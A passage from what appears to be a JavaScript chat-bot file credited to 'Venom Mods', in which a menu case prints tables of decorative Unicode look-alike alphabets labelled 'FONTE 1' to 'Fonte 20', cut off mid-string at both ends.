ΔΜƗŽΔĐ\u20ACৎ̤\u2719֟\u066D\xA0 ஓீۣ̤֟͜\u066D̤֟ ঔ\xA0 ፝͡ৎ\u2745̤֟\u066D\xA0\xA0 ፝͡ৎ\u271E̤֟\u066D\xA0 \u2E0E\u271E\n\u2727\n\u2661\xA0 ৎ\u2765̤֟\u066Dۣۜ ஓீ፝͜͡\xA0S\u0488O\u0488N\u0488H\u0488A\u0488D\u0488O\u0488R\u0488A\u0488ৎ\u273F̤֟\u066D \xA0 \u2726ۣۜۜ\u2606ۜۜ͜͡\xA0\xA0 ঔৣֳ᷌᷈͜͡\u2740 ్మాై\xA0 ू ፝͜\u2765 ೈ፝͜͡๖ۣۜ\xA0\xA0 ৎ\u273F̤֟\u066D ೈ፝\n\n\u2726\u0488͜͡\u27B3 ீ͜ৡৢ͜͡\xA0\xA0 ๖ۣۜۜ͜͡ீ͜\xA0\xA0 ೈ፝͜͡\xA0\xA0\xA0 ঔৣ͜͡\xA0\u2727\xA0 ৢۜ͜͡\u271F ঔৣ͜͡ீ͜\u2765͜ঔৣ\nลѦคᎯสﾛꍏ开ਸ\uD83C\uDE37 \n\n\uD83C\uDDE7乃вβƁദЂß\u0E3FႪЬҍცɮɞᏰᕊℬᙖ侈\n\n\uD83C\uDDE8匚\xA2ḉ\u20A1ე\u20B5ႠƇꉓᏣᑕℂとͼℭ\n\n\uD83C\uDDE9刀\u2202ÐↁƊժ\u2285ԃԂꀸᖱᎴᖙᗪᗬ\n\n\uD83C\uDDEAモєΣعэㄠპ\u212E\u2208\u2211ξϵﾓ౬ꍟᏋᙓℰ\u326B ૯を\n\n\uD83C\uDDEB下f\u20A3ҒՔ౯Բヂբꎇℱ Բ\n\n\uD83C\uDDECムg\u2761Ⴚ\u20B2ʛｇꁅℊᎶᏩԌੲǤ\n\n\uD83C\uDDED卄нஅअĦዠせけみんჩℋℍザਮ\u2645ℌ\n\n\uD83C\uDDEE工ιΞ\u1364ቾ์łⱡ\u17DB\u1363เቖェエＩใ ɪꀤᏐⅈɨ \xA1\n\n\uD83C\uDDEFCD\u20ADҝƘӃꀘᏦҡ \n\n\uD83C\uDDF1ㄥℓ ŁﾚⱠⱢ\u2220\u20BAし८ไ\u20B0Լ廴\uA492ℒむもꞭ\n\n\uD83C\uDDF2爪м๓றℳო\u0BF1൬ლຕឮᙢᗰϻ从\n\n\uD83C\uDDF3れиภฑரƝห\u20AA\u20A6Ⴖல\u2229ຖหℕᏁग़ͷη\n\n\uD83C\uDDF4口σѻØᘎø\u0E4FΘФӨのѺ\u274DΩҩᎧҨᏫᎤԾ \u2742\n\n\uD83C\uDDF5ㄗρㄕ ƤPᎵᕈթア\u20B1や\u2118ԹｱヱᖘᎮ 伊\n\n\uD83C\uDDF6Ｑqℚ \n\n\uD83C\uDDF7尺яरℜरै\u20B9 ԄƦʀꋪ\u2742\nԻᖇℛℝᏒ\u2608尻\n\n\uD83C\uDDF8丂s\uD83D\uDCB2Şڪşک\u20B7នঊՖᎦฐຮꌗऽธ\n\n\uD83C\uDDF9匕тτŦƬ\u2020\u20AE\u09F3Ⴕ\u20B8すｲ イकԵ\uA4C4ནᅮ\u2533\u2213\u2628Ꭲ\n\n\uD83C\uDDFA\u222AυยひปႮখʊƲ\u222AนบฆնບນꀎᏌᏠथ໓\n\n\uD83C\uDDFB\u2228νƔ۷ɣᐯᏉᏤ\n\n\uD83C\uDDFC山ωwฬ\u20A9Ꮃ\u0BF0ຟฝѠШพผฟຜຝᙡਘ\n\n\uD83C\uDDFDメ\u2717\u2718\u2716Ж\xD7ꊼ艾 \n\n\uD83C\uDDFEㄚуΥﭏצּҰ\xA5УұץჄყעꌩ\u2442Ꭹϒ\n\n\uD83C\uDDFF乙zƵƶʑẕꁴᏃℤ\n\nA=Δ\uA670 Λ λ Ⱥ \u20B3 ą å ส สั ล α ค ศ Ⴉ \uD83C\uDDE6 \uD83C\uDDE6ศ \u20B3 ﾑΔ a ɑ Ă 厾 λ α Λ ɐ ส丹\u24D0 Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ\nम स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ a\u0489 岚 ๖ۣۜa ꬍꬅ 刄 㞩\n\nв=多\uD83C\uDDE7 乃 ঔৣ͜͡岌 в \u0E3F ß β ც\u24D1 ხ ɮ β ß \u0E3F Ъ طß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь Ɓ ß \u0E3F Þ 乃 邦 ぶ \u2707 及 в Ⴊ \uD83C\uDDE7 ๖ۣۜв 夃 ଷ\nゐßѢƀЪЬβϐбБъьわゎらね \u266D ɓ в\u0489 ㄢ \n\nc=\xA2 \u20A1 \u20A2 c ς \u2282 匚 ㄷ ど に 二仁 \uD83C\uDDE8 ɕ ૮ c\u0489 ๖ۣۜc Շ \uD83C\uDDE8 \xA2 \u20A1 ᄃ c̈̈ ɔ ς \xA9c\xA2 ς \xA9 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\xA2 Ĉ č Č \xA9 ĉ Ć ૮\n\nd=ↁ Đ ɗ đ δ ɖ わ 力 \u2283̸ \u2285໓ \uD83C\uDDE9 \u220C d\u0489 刀 Ɗ\n๖ۣۜd ಖ \uD83C\uDDE9đ Đ ɖ \u24D3 \u2202 ժÐ \u2202 đ ۜÐ \u20ABÐ \u2202 ð đ ๔ მ ძ ժ ɗ \n\ne=Ɇ \u20AC \u212E \u326B \u2209 \u2208 Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ を\nﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ \uD83C\uDDEA e\u0489 亥 ૯ ๖ۣۜe も ƎƏ Ɛ \u060F៩ \uD83C\uDDEA 乇 Є є Σ ε ξ \u24D4 玄 ៩ \u20A4 ჰ პ\u212E\xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē \u20AC ξ έ \u212E ë Э ۼ\n\nғ=Ғ ƒ Բ下 ﾁ Ϝ ғヂ Ք ғ 下 \uD83C\uDDEB ғ\u0489. ๖ۣۜғ  \uD83C\uDDEB ｷ \u20A3 ʃ ғ \u24D5 ғ Ғƒ Բ ๖ۣۜғ \u20A3ƒ \u20A3 ﬄ ךּ דּ Ғ ક \n\ng=\u20B2 ǥ Ⴚ Ǥ \u2761 ሬ \uD83C\uDDEC Ԍ g\u0489 ๖ۣۜg ໔ ໕ ផ \u0BF9\n\uD83C\uDDEC Ĝ Ģ g g̈̈ \u24D6 \u20B2 \u0BF9 ğ g๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ \u20A2 ɠ ૬ ǥ\n\nн=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ \uD83C\uDDED \u2560\u2563 н み ђ ๖ۣۜн ਮ \uD83C\uDDED ん ħ н ђ அ ჩ ħ \u2560\u2563 ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ\u2560\u2563\n\nι=\u1364 ɨ \u17DB í \u2223 ழェ エ ｪ ｴ 工讠 辶 เ ቾ \uD83C\uDDEE \u0489 ι\u0489 \n๖ۣۜι ⶇⷀ \uD83C\uDDEE ί Ξ រ ł ιΐ ι \u2551ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ\n\nj=ʝĲ ｊ Ｊ ʲქ ჟ \uD83C\uDDEF j ℑ ๖ۣۜj \uD83C\uDDEFʝ ქ j Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ\n\nĸ=Ҝ Ҟ Ӄ \u20AD Ҝ 长 ҟ Ҡ ҡ ӄ ҝ  \uD83C\uDDF0 Ƙ ĸ ઝ ๖ۣۜĸ\uD83C\uDDF0 \u20AD Ҝ κ ķ К к ๖ۣۜĸ ઝ Қ ķ к Ҝ \u20AD К қ ҝ\n\nl=Ł Լ ℓ \u221F ﾚ し ̽ſ ʆ ไ \u20B0 \uD83C\uDDF1よ๊レ 廴 l\u0489 ㄥ ๖ۣۜl โ Ն \u20BA \uD83C\uDDF1 Ł \u20B0 ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ \u2518\xA3 ไŁ ℓ Ļ ๋\u255DԼ\n\nм=ℳ ๓ ற м რ ო ɱ \u20A5 Ӎ  ボ /v 水 ണ Ӎ \uD83C\uDDF2 м\u0489 爪 ๖ۣۜм\n\uD83C\uDDF2 м ℳ რ ற ო ɱ ๓ ʍ დლм ற /v ๓ ๖ۣۜм Щ๓ ற м \u20A5 რ ო ɱ\n\nn=\u20A6 Ń ņ ரŋИ ภй מ Ň หฑ иη\u2229 ல \u20AA ൯ Ŋ n\u0489 れ ๖ۣۜn ฌ ญ ൮ വശഷസ Л\uD83C\uDDF3и \u20A6 Π \u20AA η ெ வ йи η ŋ ฑ ர И ภ й Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\n\no=Ѻ θ Θ \u274D \u25EF 〇Ծ\u0489 ゆ \u2205 Ø Ծ Օ ס \u2297 \u20B4 Θ ΦϕФ Ω θ๑ \u0E4F ο ๐ σ ø ѳ Ѻ Ѳ Ө ०\nの \uD83C\uDDF4 \u06DD o 口 ๖ۣۜo 汩 ଠ \uD83C\uDDF4Ø\u0E4Fσǿ\u2295ƠФץםץ\u20B4ΘԾøΩ\u274Dტიბθ\u2742 ø σ Ø ૭ Ǿ ö \u2642 ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B\u263A θ Ө ɵҨ\n\np=\u2118 \u20B1 了 ァ户 ㄕ尸 卩卫 ƿ ρ م թ ｱ ק \xB6 や ゃ ア マ ャ ヤ ヹ ｱ  \uD83C\uDDF5 伊 \u0489 p\u0489 ㄗ ๖ۣۜp 尹 \uD83C\uDDF5ρ ק թ þ φÞ \u2560\u255Dקּ թ φ þ քק Þ ρ p๋ \u203D ρ ƿ ք թ ॐ \n\nq=φ Ҩ ҩ. \uD83C\uDDF6 ϑ q\u0489 ๖ۣۜq\uD83C\uDDF6q ๖ۣۜqǪ ǫ գ\n\nr=ℜ Ԅ रै\u20B9Я 訳 尺 㞍尻尺 尼 尽 Ի ʀ ɾ я Я 民 \uD83C\uDDF7 r\u0489 屁 ૨ ๖ۣۜr ฯ ণ 尺 尻 я ℜ Γ я \xAE л Я Ř ř ર ŗ ѓ ל гг ŗ я \xAE Я Ŗ\n\nѕ= ฐ ร ຮ ธ ऽ \u20B7 ֆ ى ک উ ঊ Տ હ ៜ \uD83C\uDDF8 ട\n乌马 写 ㄅ ㄘㄎ 亐令 ѕ\u0489 Ｓ ๖ۣۜѕ ঙ ຣ ଌ \uD83C\uDDF8ঊ \u20B7 ន ѕ ร \u20B4 ஜى \xA7 ร ş ئ ટ ک Ŝ š હ Ş ઽ ՏȘ ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ \n\nт=\u2533  \u271E \u3012 Ԏ Ŧ \u20AE \u09F3 ॠ ŧ ჭ \u22A5 匕十 क़ 丁 も デ テ ナ ㄤ ｲ 亻 ট ゼ Ⴀ \uD83C\uDDF9\n平 亇 т\u0489 す ๖ۣۜт ক ፐ ፓ 弋 字 \uD83C\uDDF9т \u2020 է Ե ｲ Ŧ \u09F3ჯ \u20AE क も ł \u253C \u2020 т Ŧ Ţ Ť ŧ \u3036\u3012ł Ŧ \u2670 Ƭ τ \u2020 \n\nυ=น Ü บ ป ย ษ ข μ い ų น บ ป\u222A リ ㄩ凵びひ სυʉ \uD83C\uDDFA Ҵ ચ થ ს υ\u0489 む ષ ๖ۣۜυ Ⴎ ษ \uD83C\uDDFA ひ υ ს \u222Aચ µ Ü ü џ ů ย Û û ŭ ن น ષย џ ផ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\n\nv=\u221A 讠 \uD83C\uDDFB v\u0489 \u2228 ๖ۣۜv ง \uD83C\uDDFBν\u2207\u221A ૪\u221A ٧ ს\n\nw= \u20A9 ฬ ผ ฝ พ ฟ \u0BF0 ឃ ω \uD83C\uDDFC w\u0489 ખ 山 ๖ۣۜw ຟ \uD83C\uDDFC Ѡ Ш \u20A9 ωŴ ω ŵ ખ ώ ฬ ฝ พ ฟ ﷲ ਘ\n\nх =\xD7 区\xD7义冈区囟ҳ̸Ҳ̸ҳ\u2718\u2717 χ \uD83C\uDDFD 乂 х\u0489. メ ๖ۣۜх \uD83C\uDDFDχ Ҳ ҳ \u2716χ Ж ჯ \xD7א ﭏ Ҳ ҳ χ \xD7\n\ny = ƴ \xA5 丫吖 Ɏ Ύ Ⴘ 쏘 γ צ ყ Ⴘ Ⴗ ע γ у y ﻻ ㄚ Ⴤ \uD83C\uDDFE ψ Ψ y\u0489. ๖ۣۜy \u2F2C Ƴ\uD83C\uDDFEу Ψ ყ γμ\xA5 ﻻ ŷ Ў ყ γ ÿ ý ५У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\nΖั = ʑ Ӡ ӡ ろ る 乙 之 z ƶ ȥ ʒ ʐ ʑ ƺ ʓ \uD83C\uDDFF z\u0489 \uD83C\uDDFF z 乙 ζ Հ Ż ž ζ ż Ƶ Հ ƶ ƺ\n\nᵃ ᵇ ᶜ ᵈ ᵉ ᶠ ᵍ ʰ ᶤ ʲ ᵏ ˡ ᵐ ᶰ ᵒ ᵖ ˁ ʳ ˢ ᵗ ᵘ ᵛ ʷ ˣ ʸ ᶻ ᵈˡᶜ ᶤ ᶫᵒᵛᵉ ʸᵒᵘ\n\nᴬ ᴮ \u055F ᴰ ᴱ ˁ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴼ ᴾ ᵠ ᴿ \u2075 ᵀ ᵁ ᵛ ᵂ ᵡ ᵞ ᶻ\n\n\u2070 \xB9 \xB2 \xB3 \u2074 \u2075 \u2076 \u2077 \u2078 \u2079\n\n就像模像ા િ ી ુ ૂ ૃ ૄ ૅ ે ૈ ૉ \u20A1\u20A2\u20A3\u20A4\u20A5\u20A6\u20A9\u20AA\u20AB\u20AD\u20AF\u20BE\u20BD\u20BB\u20BA\u20B8\u20B7\u20B6\u20B6\u20B5\u20B4\u20B4\u20B2\u20B0\u20B1\u20B3\u2E3F\u2E1A\u2E1Bⶬ\u2EDE\u2E19ㆃ㑹䡤 \u2592\u2591\u2593 \u0489 \u0488 ℳℴℵ\u2125ℤℨ\u2118ℜ\n\u2654\u2655\u2656\u2656\u2657\u2658\u265A\u265D\u265F\u2660\u2662\u2662\u2663\u2664\u2666\u2668\u2680\u2682\u2683\u2685\u2767\u2765\u2765\u2764 ๖ۣۜ͡ஓீ͜͡ι\n\u2763\u2760\u2760\u2751\u2752\u2741\u2743\u2745\u2754\u2754\u2756\u2746\u2747\u2748\u2759\u2759\u274B\u275C\u275D\u275E\u274F\u274E\u274D\u274C\u274A\u274A\u2749\u2748\u2747\u2745\u2744\u2742\u2740\u2740\u2730\u2731\u2733\u2733\u2734\u2735\u2737\u2737\u2738\u2739\u273A\u273B\u273C\u273D\u273F\u272F\u272E\u272B\u272B\u272A\u2727\u21DD͜͡Σsէ૨Σረለ\u272B\u272B\u271F.\u2726\u2725\u2724\u2724\u2723\u2722\u2721\u2721\u2720\u271F\u271E\u271C\u271B\u271A\u2719\u2718\u2718\u2716\u2716\u2717\u2715\u2714\u2713\u2712\u2711\u270D\u270E\u270F ೈ፝͜͡ ঔৣ͜͡\u27B3 \u21DD\u2766ۜ\u272Fۣۜৡৡۣۜ\u272Fۜ\u2766\u21DC\uA9C1\u1B7C\u2E3C\u271E\u2E3C\u1B7C\uA9C2 ঔৣ͜͡ீ͜\u2765͜ঔৣ\uD83D\uDC7C \u2E0E\u2734\u2022เั\u2022\u2734\u2E0E ঔৣ͜͡\u27B3ೈ፝͜͡\u0FC7\u21ADৢۜ͜͡\u271F\u2717\u2719\u271A\u271B\u2720\u271F\u271E\u271C\u2722\u2726\u2727 \u2726\u272E\u272D\u272C\u272B\u272A\u2729\u272F\u2730\u273A\u2739\u2738\u2737\u2736\u2735\u2742\u2767\u2766 \u21DD\u2766ۜ\u272Fۣۜৡৡۣۜ\u272Fۜ\u2766\u21DC\uA9C1\u1B7C\u2E3C\u271E\u2E3C\u1B7C\uA9C2ঔৣ͜͡ீ͜\u2765͜ঔৣ\uD83D\uDC7C \u2E0E\u2734\u2022เั\u2022\u2734\u2E0E\uD83D\uDD34\u26AA\u26AB\n๖ۣۜۜ͜͡ஓீ͜ ۣۜ    ፝͡ৎ\u271E̤֟\u066D ৢۜ͜͡\u271F\u221Aɩτơ  ৎ\u2765̤֟\u066D  ৎ̤\u2719֟\u066D  ஓீۣ̤֟͜\u066D̤֟ ঔ  ፝͡ৎ\u2745̤֟\u066D   ፝͡ৎ\u271E̤֟\u066D  \u2E0E\u271E\n\n\u2665\uD83C\uDF43ஓீ፝͜\u2741̤֟ S\u0488\nஜ͜͜͡\u2661͜ৢ\u270D\uD83C\uDFFB\u2665\n\u2661  ৎ\u2765̤֟\u066Dۣۜ ஓீ፝͜͡   \u2726ۣۜۜ\u2606ۣۜۜ͜͡   ঔৣֳ᷌᷈͜͡\u2740 ్మాై  ू ፝͜\u2765S\u0488 ೈ፝͜͡๖ۣۜ   ৎ\u273F̤֟\u066D \n*ீ͜ৡৢ͜͡\u2726\u0488͜͡      \u0488͜͡\u2606ۣۜۜ͜͡  \u0488͜͡\u2606ۣۜۜ͜͡  \n\u2726\u0488͜͡\u27B3 ீ͜ৡৢ͜͡   ๖ۣۜۜ͜͡ீ͜   ೈ፝͜͡    ঔৣ͜͡   ৢۜ͜͡\u21DD͜͡Σsէ૨Σረለ\u271F. ঔৣ͜͡\xA0\u2727სɩτơર ঔৣ͜͡ீ͜\u2765͜ঔ   ፝͜͡\u0FC7\nれ \u20A1 \u20A9 \u20A4 \u20A6 \u20B1 \u20B2 \u20B0 \u20B3 \u20B7 \u20B8 \u20B9 ℐ ℑ ℒ ℊ ℌ ℍす や \u2F33 ひ ቻ ঊ ֆ \u2118 ℙ ℚ ℛ ℜ ℝ \u2123 ℤ ℬ ℰ ℭ ℱ ℳ ⅅ ⅆ  Ǥ 㞩 ↁ Ҩ むc ⷀ \u20A6 み ↁ \u060F 亇 ł \u274D\nｷ Ⱥ 多 及 Δ̸ 弋  ៩ ൬̸ 岌 \u20AE ቾ ℴ 玄 么 \u0E3F 令 它汩 ๖ۣۜЯ Ғ 平 Ұ \xA5 У 丹 ム ̸\u2285 Ɗ 乞 Σ ん 长 ไ \u20B0 Ɲ Θ Ø ៜ ゼ も 开 ᮈ\n\nBy Venom Mods \n\n',
            'pink'
          )
        ),
        await sleep(6000),
        main()
    case 'tabela2':
      console.log(
        color(
          '\n\n By Venom Mods \n*ৢۜ͜͡ \u271Fℳ\xA5ֆ\u20AE\u1364\u20A1ৎ\u271E̤֟\u066D*\n*ŦΛßɆĿΛ DɆ ĿɆŦŔΛS*\n*M\u0489A\u0489F\u0489I\u0489A\u0489 D\u0489O\u0489S\u0489 T\u0489U\u0489T\u0489O\u0489R\u0489I\u0489A\u0489I\u0489S\u0489*\n*11/10/2018*\n*FONTE 1*\n\u24D0 \u24D1 \u24D2 \u24D3 \u24D4 \u24D5 \u24D6 \u24D7 \u24D8 \u24D9 \u24DA \u24DB \u24DC \u24DD \u24DE \u24DF \u24E0 \u24E1 \u24E2 \u24E3 \u24E4 \u24E5 \u24E6 \u24E7 \u24E8 \u24E9\n*FONTE 2*\nᎯ Ᏸ Ꮸ Ꭰ Ꭼ Ꮀ Ꮆ Ꮋ Ꭸ Ꮰ Ꮶ Ꮭ Ꮇ Ꮑ Ꮎ Ꮲ Ꮕ Ꮢ Ꮥ Ꮏ Ꮼ Ꮙ Ꮿ Ꮂ Ꮍ Ꮓ\n*FONTE 3*\nA̸ B̸ C̸ D̸ E̸ F̸ G̸ H̸ I̸ J̸ K̸ L̸ M̸ N̸ O̸ P̸ Q̸ R̸ S̸ T̸ U̸ V̸ W̸ X̸ Y̸ Z̸\n*FONTE 4*\nA̲̅ B̲̅ C̲̅ D̲̅ E̲̅ F̲̅ G̲̅ H̲̅ I̲̅ J̲̅ K̲̅ L̲̅ M̲̅ N̲̅ O̲̅ P̲̅ Q̲̅ R̲̅ S̲̅ T̲̅ U̲̅ V̲̅ W̲̅ X̲̅ Y̲̅ Z̲̅\n*FONTE 5*\nΛ ß \u20B5 D Ɇ F \u20B2 Ĥ Ī Ĵ Ҡ Ŀ M И Ø \u20B1 Q Ŕ S Ŧ Ʉ \u221A \u20A9 Ӿ Y Z\n*FONTE 6*\nA\u0489 B\u0489 C\u0489 D\u0489 E\u0489 F\u0489 G\u0489 H\u0489 I\u0489 J\u0489 K\u0489 L\u0489 M\u0489 N\u0489 O\u0489 P\u0489 Q\u0489 R\u0489 S\u0489 T\u0489 U\u0489 V\u0489 W\u0489 X\u0489 Y\u0489 Z\u0489\n*FONTE 7*\n\u2206 ๒ ς \u2202 \u2211 ﾓ б ｻ ⅰ ﾉ к ﾚ \u33A1 и \u25CA ㄕ q Я ㄅ ɬ ㄩ \u221A ω χ ㄚ z\n*FONTE 8*\nꍏ ꌃ ꉓ ꀸ ꍟ ꎇ ꁅ ꃅ ꀤ ꀭ ꀘ \uA492 ꎭ ꈤ ꂦ ᖘ ꆰ ꋪ ꌗ \uA4C4 ꀎ ᐯ ꅏ ꊼ ꌩ ꁴ\n*FONTE 9*\nɑ ҍ ϲ ժ ҽ ƒ ց հ í յ κ Ӏ ʍ ղ օ Թ զ ɾ Տ Ե մ ѵ ա \xD7 վ Հ\n*FONTE 10*\nλ B \u20A1 Ð E \u20A3 G Ҥ ł J \u20AD Ł M \u20A6 0 P Q R \u20B4 Ŧ U V \u20A9 X \xA5 Z\n*FONTE 11*\nႩ Ⴊ ე მ პ f Ⴚ Ⴌ i ქ k l ო Ⴖ ტ Ⴒ Ⴍ R Ⴝ Ⴀ Ⴎ V w ჯ Ⴤ ჰ\n*FONTE 12*\n\uD83C\uDD70 \uD83C\uDD71 \uD83C\uDD72 \uD83C\uDD73 \uD83C\uDD74 \uD83C\uDD75 \uD83C\uDD76 \uD83C\uDD77 \uD83C\uDD78 \uD83C\uDD79 \uD83C\uDD7A \uD83C\uDD7B \uD83C\uDD7C \uD83C\uDD7D \uD83C\uDD7E \uD83C\uDD7F \uD83C\uDD80 \uD83C\uDD81 \uD83C\uDD82 \uD83C\uDD83 \uD83C\uDD84 \uD83C\uDD85 \uD83C\uDD86 \uD83C\uDD87 \uD83C\uDD88 \uD83C\uDD89\n*FONTE 13*\nA⃒ B⃒ C⃒ D⃒ E⃒ F⃒ G⃒ H⃒ I⃒ J⃒ K⃒ L⃒ M⃒ N⃒ O⃒ P⃒ Q⃒ R⃒ S⃒ T⃒ U⃒ V⃒ W⃒ X⃒ Y⃒ Z⃒\n*Fonte 14*\n\xA0\u2665๑̶๋ۣۜẶ\u2022 \u2665๑̶๋ۣۜḆ\u2022 \u2665๑̶๋ۣۜḈ\u2022 \u2665๑̶๋ۣۜḊ\u2022 \u2665๑̶๋ۣۜḜ\u2022 \u2665๑̶๋ۣۜḞ\u2022 \u2665๑̶๋ۣۜḠ\u2022 \u2665๑̶๋ۣۜḦ\u2022 \u2665๑̶๋ۣۜḮ\u2022 \u2665๑̶๋ۣۜĴ\u2022 \u2665๑̶๋ۣۜḲ\u2022 \u2665๑̶๋ۣۜḺ\u2022 \u2665๑̶๋ۣۜṂ\u2022 \u2665๑̶๋ۣۜṈ\u2022 \u2665๑̶๋ۣۜṎ\u2022 \u2665๑̶๋ۣۜṖ\u2022 \u2665๑̶๋ۣۜQ\u2022 \u2665๑̶๋ۣۜṜ\u2022 \u2665๑̶๋ۣۜṨ\u2022 \u2665๑̶๋ۣۜṬ\u2022 \u2665๑̶๋ۣۜṲ\u2022 \u2665๑̶๋ۣۜṾ\u2022 \u2665๑̶๋ۣۜẈ\u2022 \u2665๑̶๋ۣۜẌ\u2022 \u2665๑̶๋ۣۜỴ\u2022 \u2665๑̶๋ۣۜẐ\u2022\n*Fonte 15*\n\u2665̶̸̶̶̸̶๋๋Ḁ \u2665 ̶̸̶̶̸̶๋๋Ḇ \u2665 ̶̸̶̶̸̶๋๋Ḉ \u2665̶̸̶̶̸̶๋๋Ḋ \u2665 ̶̸̶̶̸̶๋๋Ḝ \u2665 ̶̸̶̶̸̶๋๋Ḟ \u2665̶̸̶̶̸̶๋๋Ḡ \u2665 ̶̸̶̶̸̶๋๋Ḧ \u2665 ̶̸̶̶̸̶๋๋Ḯ \u2665̶̸̶̶̸̶๋๋Ĵ \u2665 ̶̸̶̶̸̶๋๋Ḳ \u2665 ̶̸̶̶̸̶๋๋Ḻ \u2665̶̸̶̶̸̶๋๋Ṃ \u2665 ̶̸̶̶̸̶๋๋Ṉ \u2665 ̶̸̶̶̸̶๋๋Ṏ \u2665 ̶̸̶̶̸̶๋๋Ṗ \u2665̶̸̶̶̸̶๋๋Q \u2665 ̶̸̶̶̸̶๋๋Ṝ \u2665 ̶̸̶̶̸̶๋๋Ṩ \u2665̶̸̶̶̸̶๋๋Ṭ \u2665 ̶̸̶̶̸̶๋๋Ṳ \u2665 ̶̸̶̶̸̶๋๋Ṿ \u2665̶̸̶̶̸̶๋๋Ẉ \u2665 ̶̸̶̶̸̶๋๋Ẍ \u2665 ̶̸̶̶̸̶๋๋Ỵ \u2665̶̸̶̶̸̶๋๋Ẑ\n*Fonte 16*\n̶̸̶̶̸̶๋๋Ḁ ̶̸̶̶̸̶๋๋Ḇ ̶̸̶̶̸̶๋๋Ḉ ̶̸̶̶̸̶๋๋Ḋ ̶̸̶̶̸̶๋๋Ḝ ̶̸̶̶̸̶๋๋Ḟ ̶̸̶̶̸̶๋๋Ḡ ̶̸̶̶̸̶๋๋Ḧ ̶̸̶̶̸̶๋๋Ḯ ̶̸̶̶̸̶๋๋Ĵ ̶̸̶̶̸̶๋๋Ḳ ̶̸̶̶̸̶๋๋Ḻ ̶̸̶̶̸̶๋๋Ṃ ̶̸̶̶̸̶๋๋Ṉ ̶̸̶̶̸̶๋๋Ṏ ̶̸̶̶̸̶๋๋Ṗ ̶̸̶̶̸̶๋๋Q ̶̸̶̶̸̶๋๋Ṝ ̶̸̶̶̸̶๋๋Ṩ ̶̸̶̶̸̶๋๋Ṭ ̶̸̶̶̸̶๋๋Ṳ ̶̸̶̶̸̶๋๋Ṿ ̶̸̶̶̸̶๋๋Ẉ ̶̸̶̶̸̶๋๋Ẍ ̶̸̶̶̸̶๋๋Ỵ ̶̸̶̶̸̶๋๋Ẑ\n*Fonte 17*\n۰۪۫Ḁ ۰۪۫Ḇ ۰۪۫Ḉ۰۪۫Ḋ ۰۪۫Ḝ۰۪۫Ḟ ۰۪۫Ḡ۰۪۫Ḧ ۰۪۫Ḯ۰۪۫Ĵ ۰۪۫Ḳ۰۪۫Ḻ ۰۪۫Ṃ۰۪۫Ṉ ۰۪۫Ṏ۰۪۫Ṗ ۰۪۫Q۰۪۫Ṝ ۰۪۫Ṩ۰۪۫Ṭ ۰۪۫Ṳ۰۪۫Ṿ ۰۪۫Ẉ۰۪۫Ẍ ۰۪۫Ỵ۰۪۫Ẑ\n*Fonte 18*\nЂ Ѓ Є Ѕ І Ї Ј Љ Њ Ћ Ќ Ў Џ А Б В Г Д Е Ж З И Й К Л М Н О П Р С Т УФ Х Ц Ч Ш Щ Ъ Ы Ь Э Ю Я\n*Fonte 19*\n\u2663๑̶๋ۣۜẶ\u2022 \u2663๑̶๋ۣۜḆ\u2022 \u2663๑̶๋ۣۜḈ\u2022 \u2663๑̶๋ۣۜḊ\u2022 \u2663๑̶๋ۣۜḜ\u2022 \u2663๑̶๋ۣۜḞ\u2022 \u2663๑̶๋ۣۜḠ\u2022 \u2663๑̶๋ۣۜḦ\u2022 \u2663๑̶๋ۣۜḮ\u2022 \u2663๑̶๋ۣۜĴ\u2022 \u2663๑̶๋ۣۜḲ\u2022 \u2663๑̶๋ۣۜḺ\u2022 \u2663๑̶๋ۣۜṂ\u2022 \u2663๑̶๋ۣۜṈ\u2022 \u2663๑̶๋ۣۜṎ\u2022 \u2663๑̶๋ۣۜṖ\u2022 \u2663๑̶๋ۣۜQ\u2022 \u2663๑̶๋ۣۜṜ\u2022 \u2663๑̶๋ۣۜṨ\u2022 \u2663๑̶๋ۣۜṬ\u2022 \u2663๑̶๋ۣۜṲ\u2022 \u2663๑̶๋ۣۜṾ\u2022 \u2663๑̶๋ۣۜẈ\u2022 \u2663๑̶๋ۣۜẌ\u2022 \u2663๑̶๋ۣۜỴ\u2022 \u2663๑̶๋ۣۜẐ\u2022\n*Fonte 20*\n\u2663̶̸̶̶̸̶๋๋Ḁ \u2663 ̶̸̶̶̸̶๋๋Ḇ \u2663 ̶̸̶̶̸̶๋๋Ḉ \u2663̶̸̶̶̸̶๋๋Ḋ \u2663 ̶̸̶̶̸̶๋๋Ḝ \u2663 ̶̸̶̶̸̶๋๋Ḟ \u2663̶̸̶̶̸̶๋๋Ḡ \u2663 ̶̸̶̶̸̶๋๋Ḧ \u2663 ̶̸̶̶̸̶๋๋Ḯ \u2663 ̶̸̶̶̸̶๋๋Ĵ \u2663 ̶̸̶̶̸̶๋๋Ḳ \u2663 ̶̸̶̶̸̶๋๋Ḻ \u2663 ̶̸̶̶̸̶๋๋Ṃ 